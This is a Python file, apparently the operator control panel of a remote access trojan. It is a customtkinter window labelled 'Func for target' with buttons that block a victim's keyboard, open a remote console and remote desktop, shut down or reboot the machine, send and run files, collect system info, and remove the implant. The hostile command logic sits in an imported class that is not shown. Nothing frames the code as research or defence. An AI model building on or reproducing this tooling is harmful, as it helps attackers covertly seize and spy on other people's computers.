import customtkinter as ctk
from server_gui import CommandFunction

class FunctionApp(ctk.CTk):
    def __init__(self, ip, port, server):
        super().__init__()

        self.ip = ip
        self.port = port
        self.server = server

        self.title("Function")
        self.geometry("600x500")
        
        self.comm = CommandFunction(self.server)
        self.create_func_app()

        #self.comm.download_file(ip, port, 'playit.txt') - скачивание файла
    
    def create_func_app(self):
        self.gbw_func_frame = ctk.CTkFrame(self, width=600, height=60, fg_color='#4B0082')
        self.gbw_func_title = ctk.CTkLabel(self.gbw_func_frame, text=f'Func for target: {self.ip}', text_color='black', font=('Bold', 25))
        self.gbw_func_frame.pack(side='top', fill='x')
        self.gbw_func_title.pack(side='top', pady=10)

        self.tabview = ctk.CTkTabview(self)
        self.tabview.pack(side='top', fill='both', expand=True)

        self.tabview.add("Fun")
        self.tabview.add("System")
        self.tabview.add("Files")
        self.tabview.add("Info")

        self.add_content_to_tabs()

    def add_content_to_tabs(self):
        self.fun_tab = self.tabview.tab("Fun")

        self.input_link = ctk.CTkEntry(self.fun_tab, width=300, height=40, placeholder_text='Enter link', font=('Bold', 20), text_color='green')

        self.open_link_btn = ctk.CTkButton(self.fun_tab, text="Open link", height=50, width=200,
                                           command=lambda: self.comm.open_link(self.ip, self.port, self.input_link.get()), font=('Bold', 15), fg_color='#9370DB')
        
        self.blockinput_btn = ctk.CTkButton(self.fun_tab, text='Block keyboard', height=50, width=200,
                                command=lambda: self.comm.block_input(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')

        self.blockinput_btn.place(x=10, y=70)
        self.input_link.place(x=10, y=10)
        self.open_link_btn.place(x=330, y=7)


        self.sys_tab = self.tabview.tab("System")
        self.console_btn = ctk.CTkButton(self.sys_tab, text='Console', height=50, width=200,
                                command=lambda: self.comm.console(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
        
        self.off_btn = ctk.CTkButton(self.sys_tab, text='Off pc', height=50, width=200,
                                command=lambda: self.comm.off_pc(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
        
        self.reboot_btn = ctk.CTkButton(self.sys_tab, text='Reboot pc', height=50, width=200,
                                command=lambda: self.comm.off_pc(self.ip, self.port, True), font=('Bold', 15), fg_color='#9370DB')
        
        self.remote_desk_btn = ctk.CTkButton(self.sys_tab, text='Remote Desktop', height=50, width=200,
                                command=lambda: self.comm.remote_desktop(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
        
        self.ping_btn = ctk.CTkButton(self.sys_tab, text='DELETE YOURSELF FROM PC', height=50, width=500, fg_color='red', 
                                       command=lambda: self.comm.kill_yourself(self.ip, self.port, "exit"), font=('Bold', 20))
        
        self.ping_btn.pack(side='bottom', pady=20, padx=20)
        self.console_btn.pack(side='top', pady=10, padx=50)
        self.remote_desk_btn.pack(side='top', pady=10, padx=50)
        

        self.file_tab = self.tabview.tab("Files")
        self.send_and_run_btn = ctk.CTkButton(self.file_tab, text='Send and run', height=50, width=200,
                                       command=lambda: self.comm.send_and_run(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
        
        self.send_file_btn = ctk.CTkButton(self.file_tab, text='Sendfile', height=50, width=200,
                                       command=lambda: self.comm.send_file(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
        
        self.send_file_btn.pack(side='top', pady=10, padx=50)
        self.send_and_run_btn.pack(side='top', pady=10, padx=50)
        

        self.info_tab = self.tabview.tab("Info")
        self.get_info_btn = ctk.CTkButton(self.info_tab, text='Get info', height=50, width=200,
                                       command=lambda: self.comm.get_info(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
        
        self.get_info_btn.pack(side='top', pady=10, padx=50)

    def show_tab(self, tab_name):
        self.tabview.set(tab_name)